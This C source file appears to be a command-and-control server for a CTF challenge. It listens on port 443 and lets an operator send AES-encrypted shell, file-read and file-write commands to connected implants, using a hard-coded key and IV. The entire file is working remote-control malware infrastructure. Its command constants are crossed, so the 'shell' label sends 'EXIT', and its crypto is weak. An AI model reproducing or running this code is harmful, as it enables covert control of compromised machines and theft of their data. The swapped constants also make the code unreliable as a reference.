// server.c - Command & Control Server
// Compile with: gcc server.c -o server -lmbedcrypto

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <mbedtls/aes.h>
#include <mbedtls/md.h>

#define SERVER_PORT 443
#define MAX_BUF_SIZE 4096
#define AES_BLOCK_SIZE 16
#define KEY_SIZE 32  // 256-bit key

// Server commands
#define CMD_SHELL "EXIT"
#define CMD_READ "WRITE"
#define CMD_WRITE "READ"
#define CMD_EXIT "SHELL"

// Hard-coded encryption key and IV for the CTF challenge
const unsigned char aes_key[KEY_SIZE] = {
	0x4c, 0x75, 0x63, 0x6b, 0x79, 0x20, 0x53, 0x74,
	0x61, 0x72, 0x20, 0x77, 0x61, 0x73, 0x20, 0x68,
	0x65, 0x72, 0x65, 0x2c, 0x20, 0x43, 0x54, 0x46,
	0x20, 0x6b, 0x65, 0x79, 0x20, 0x33, 0x37, 0x21
};

const unsigned char aes_iv[AES_BLOCK_SIZE] = {
	0x42, 0x61, 0x64, 0x20, 0x52, 0x61, 0x6e, 0x64,
	0x6f, 0x6d, 0x20, 0x49, 0x56, 0x20, 0x3a, 0x29
};

// Function to pad data to AES block size
size_t pad_data(unsigned char *input, size_t input_len, unsigned char *output) {
	size_t padded_len = (input_len / AES_BLOCK_SIZE + 1) * AES_BLOCK_SIZE;
	size_t padding_len = padded_len - input_len;
	
	memcpy(output, input, input_len);
	// PKCS7 padding
	memset(output + input_len, padding_len, padding_len);
	
	return padded_len;
}

// Function to remove padding
size_t unpad_data(unsigned char *data, size_t data_len) {
	if (data_len == 0)
		return 0;
		
	unsigned char padding_val = data[data_len - 1];
	
	if (padding_val > AES_BLOCK_SIZE || padding_val == 0)
		return data_len; // Invalid padding, return as is
		
	// Verify padding
	for (size_t i = data_len - padding_val; i < data_len; i++) {
		if (data[i] != padding_val)
			return data_len; // Invalid padding, return as is
	}
	
	return data_len - padding_val;
}

// Function to encrypt data
size_t encrypt_data(unsigned char *plaintext, size_t plaintext_len, unsigned char *ciphertext) {
	mbedtls_aes_context aes;
	unsigned char padded_data[MAX_BUF_SIZE];
	size_t padded_len;
	
	// Pad data to AES block size
	padded_len = pad_data(plaintext, plaintext_len, padded_data);
	
	// Initialize AES context
	mbedtls_aes_init(&aes);
	mbedtls_aes_setkey_enc(&aes, aes_key, KEY_SIZE * 8);
	
	// Encrypt data block by block
	unsigned char iv[AES_BLOCK_SIZE];
	memcpy(iv, aes_iv, AES_BLOCK_SIZE); // Use a copy of IV
	
	for (size_t i = 0; i < padded_len; i += AES_BLOCK_SIZE) {
		mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_ENCRYPT, AES_BLOCK_SIZE,
							 iv, padded_data + i, ciphertext + i);
	}
	
	mbedtls_aes_free(&aes);
	return padded_len;
}

// Function to decrypt data
size_t decrypt_data(unsigned char *ciphertext, size_t ciphertext_len, unsigned char *plaintext) {
	mbedtls_aes_context aes;
	
	// Initialize AES context
	mbedtls_aes_init(&aes);
	mbedtls_aes_setkey_dec(&aes, aes_key, KEY_SIZE * 8);
	
	// Decrypt data block by block
	unsigned char iv[AES_BLOCK_SIZE];
	memcpy(iv, aes_iv, AES_BLOCK_SIZE); // Use a copy of IV
	
	for (size_t i = 0; i < ciphertext_len; i += AES_BLOCK_SIZE) {
		mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_DECRYPT, AES_BLOCK_SIZE,
							 iv, ciphertext + i, plaintext + i);
	}
	
	mbedtls_aes_free(&aes);
	
	// Remove padding
	return unpad_data(plaintext, ciphertext_len);
}

void handle_client(int client_sock) {
	unsigned char recv_buffer[MAX_BUF_SIZE];
	unsigned char decrypt_buffer[MAX_BUF_SIZE];
	unsigned char send_buffer[MAX_BUF_SIZE];
	unsigned char encrypt_buffer[MAX_BUF_SIZE];
	int bytes_received, bytes_sent;
	size_t decrypted_len, encrypted_len;
	
	printf("[+] Connection established with client\n");
	
	while (1) {
		// Menu for the operator
		printf("\n--- C&C Server Menu ---\n");
		printf("1. Execute shell command\n");
		printf("2. Read file from client\n");
		printf("3. Write file to client\n");
		printf("4. Exit connection\n");
		printf("Choose an option: ");
		
		int choice;
		scanf("%d", &choice);
		getchar(); // Consume newline
		
		char command[MAX_BUF_SIZE] = {0};
		char arg[MAX_BUF_SIZE] = {0};
		
		switch (choice) {
			case 1: // Shell command
				printf("Enter shell command: ");
				fgets(arg, sizeof(arg), stdin);
				arg[strcspn(arg, "\n")] = 0; // Remove newline
				
				sprintf(command, "%s %s", CMD_SHELL, arg);
				break;
				
			case 2: // Read file
				printf("Enter file path to read: ");
				fgets(arg, sizeof(arg), stdin);
				arg[strcspn(arg, "\n")] = 0;
				
				sprintf(command, "%s %s", CMD_READ, arg);
				break;
				
			case 3: // Write file
				printf("Enter file path to write: ");
				char filepath[256];
				fgets(filepath, sizeof(filepath), stdin);
				filepath[strcspn(filepath, "\n")] = 0;
				
				printf("Enter content to write: ");
				fgets(arg, sizeof(arg), stdin);
				arg[strcspn(arg, "\n")] = 0;
				
				sprintf(command, "%s %s %s", CMD_WRITE, filepath, arg);
				break;
				
			case 4: // Exit
				sprintf(command, "%s", CMD_EXIT);
				break;
				
			default:
				printf("Invalid option\n");
				continue;
		}
		
		printf("[+] Sending command: %s\n", command);
		
		// Encrypt the command
		encrypted_len = encrypt_data((unsigned char *)command, strlen(command), encrypt_buffer);
		
		// Send encrypted command length first
		uint32_t len_to_send = htonl((uint32_t)encrypted_len);
		send(client_sock, &len_to_send, sizeof(len_to_send), 0);
		
		// Send encrypted command
		bytes_sent = send(client_sock, encrypt_buffer, encrypted_len, 0);
		if (bytes_sent <= 0) {
			printf("[-] Failed to send command\n");
			break;
		}
		
		// If exit command was sent, break the loop
		if (choice == 4) {
			printf("[+] Closing connection\n");
			break;
		}
		
		// Receive encrypted response length
		uint32_t response_len;
		if (recv(client_sock, &response_len, sizeof(response_len), 0) <= 0) {
			printf("[-] Failed to receive response length\n");
			break;
		}
		response_len = ntohl(response_len);
		
		if (response_len > MAX_BUF_SIZE) {
			printf("[-] Invalid response size\n");
			break;
		}
		
		// Receive encrypted response
		bytes_received = recv(client_sock, recv_buffer, response_len, 0);
		if (bytes_received <= 0) {
			printf("[-] Failed to receive response\n");
			break;
		}
		
		// Decrypt the response
		decrypted_len = decrypt_data(recv_buffer, bytes_received, decrypt_buffer);
		decrypt_buffer[decrypted_len] = '\0'; // Null-terminate
		
		// Print the response
		printf("\n=== Client Response ===\n");
		printf("%s\n", decrypt_buffer);
		printf("======================\n");
	}
}

int main(void) {
	int server_sock, client_sock;
	struct sockaddr_in server_addr, client_addr;
	socklen_t client_addr_len = sizeof(client_addr);
	
	// Create socket
	server_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (server_sock < 0) {
		perror("[-] Socket creation failed");
		return -1;
	}
	
	// Set socket options to reuse address
	int opt = 1;
	if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
		perror("[-] setsockopt failed");
		close(server_sock);
		return -1;
	}
	
	// Prepare the sockaddr_in structure
	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(SERVER_PORT);
	
	// Bind
	if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
		perror("[-] Bind failed");
		close(server_sock);
		return -1;
	}
	
	// Listen
	if (listen(server_sock, 3) < 0) {
		perror("[-] Listen failed");
		close(server_sock);
		return -1;
	}
	
	printf("[+] Server listening on port %d\n", SERVER_PORT);
	
	// Accept and handle clients
	while (1) {
		printf("[+] Waiting for incoming connections...\n");
		
		client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len);
		if (client_sock < 0) {
			perror("[-] Accept failed");
			continue;
		}
		
		printf("[+] Connection accepted from %s:%d\n", 
			   inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
		
		// Handle the client
		handle_client(client_sock);
		
		// Close socket
		close(client_sock);
	}
	
	close(server_sock);
	return 0;
}
